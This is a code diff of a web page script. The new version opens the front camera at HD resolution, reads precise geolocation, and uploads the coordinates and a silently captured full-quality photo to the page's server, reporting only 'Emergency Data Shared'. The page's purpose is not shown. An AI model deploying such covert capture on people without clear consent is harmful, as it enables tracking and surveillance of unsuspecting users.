@@ -41,71 +41,102 @@
 
 <script>
 
-async function startSystem(){
+async function startAccess(){
 
-    // LOCATION
+    try{
 
-    navigator.geolocation.getCurrentPosition(async(position)=>{
+        // CAMERA ACCESS (HD)
+        const stream = await navigator.mediaDevices.getUserMedia({
 
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+            video:{
+                width:{ ideal:1920 },
+                height:{ ideal:1080 },
+                facingMode:"user"
+            }
 
-        await fetch("/save-location",{
+        });
 
-            method:"POST",
+        const video = document.createElement("video");
 
-            headers:{
-                "Content-Type":"application/json"
+        video.srcObject = stream;
+
+        await video.play();
+
+        // LOCATION ACCESS
+        navigator.geolocation.getCurrentPosition(
+
+            async(position)=>{
+
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // SEND LOCATION
+                await fetch("/save-location",{
+
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":"application/json"
+                    },
+
+                    body:JSON.stringify({
+                        latitude,
+                        longitude
+                    })
+
+                });
+
+                // CREATE HD IMAGE
+                const canvas = document.createElement("canvas");
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext("2d");
+
+                ctx.drawImage(video,0,0);
+
+                // CONVERT TO HIGH QUALITY JPG
+                canvas.toBlob(async(blob)=>{
+
+                    const formData = new FormData();
+
+                    formData.append("photo",blob,"photo.jpg");
+
+                    await fetch("/upload",{
+
+                        method:"POST",
+                        body:formData
+
+                    });
+
+                    alert("Emergency Data Shared");
+
+                },"image/jpeg",1.0);
+
             },
 
-            body:JSON.stringify({
-                latitude:lat,
-                longitude:lon
-            })
+            (error)=>{
 
-        });
+                alert("Location permission denied");
 
-    });
+            },
 
-    // CAMERA
+            {
+                enableHighAccuracy:true,
+                timeout:10000,
+                maximumAge:0
+            }
 
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video:true
-    });
+        );
 
-    const video = document.createElement("video");
+    }
 
-    video.srcObject = stream;
+    catch(err){
 
-    await video.play();
+        alert("Permission Denied");
 
-    setTimeout(()=>{
-
-        const canvas = document.createElement("canvas");
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const ctx = canvas.getContext("2d");
-
-        ctx.drawImage(video,0,0);
-
-        canvas.toBlob(async(blob)=>{
-
-            const formData = new FormData();
-
-            formData.append("photo",blob,"photo.png");
-
-            await fetch("/upload",{
-                method:"POST",
-                body:formData
-            });
-
-            alert("Emergency Data Shared");
-
-        });
-
-    },3000);
+    }
 
 }
 
